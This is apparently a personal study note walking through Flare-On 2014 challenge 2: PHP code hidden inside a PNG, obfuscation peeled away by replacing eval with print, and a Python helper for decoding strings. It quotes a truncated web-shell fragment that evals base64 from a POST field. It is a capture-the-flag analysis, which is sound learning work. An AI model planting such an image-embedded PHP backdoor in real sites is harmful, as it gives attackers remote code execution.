
2025-04-10 11:39

Source: #reversing 

Tags: [[png]] 

We get a html file. So we look at page source of _home.html_. One line in particular stands out:

```
<?php include "img/flare-on.png" ?>
```

Why would a PNG image be loaded as a [[PHP]] script? When we open this image with an image viewer, the banner comes up so it is definitely an image. Since we know that the image is being loaded as a PHP script, we search for _php_ inside of the image file , Use `HxD`

[[strings]] equivalent in windows is 
```
more flare-on.png | findstr "."
```

get the `php` code and towards the end of the code replace `eval` with `print`
we get another piece of php code - repeat the process of replacing `eval` with `print`

we get b64 encoded php code on decoding it we see a mix of ascii and hex
```
if(isset($_POST["\97\49\49\6...\x6D"]))
{
eval(base64_decode($_POST["\97\49\x...
```

use the py script below to decode
```
#!/usr/bin/env python

def decode_list(l):
    o = []

    for i in l:
        if i[0] == "x":
            o.append(chr(int('0%s' % i, 0)))
        else:
            o.append(chr(int(i)))

    return ''.join(o)

print ("1st string: %s" % decode_list(["97", ..., "x6D"]))

print ("2nd string: %s" % decode_list(["97", "49", ..., "x6D"]))
```

we get the decoded mail that leads to the next challenge
### References
Flare-on 2014 C2
https://cloud.google.com/blog/topics/threat-intelligence/the-flare-on-challen/
[The-FLARE-On-Challenge-01/Challenge-2 - aldeid](https://www.aldeid.com/wiki/The-FLARE-On-Challenge-01/Challenge-2)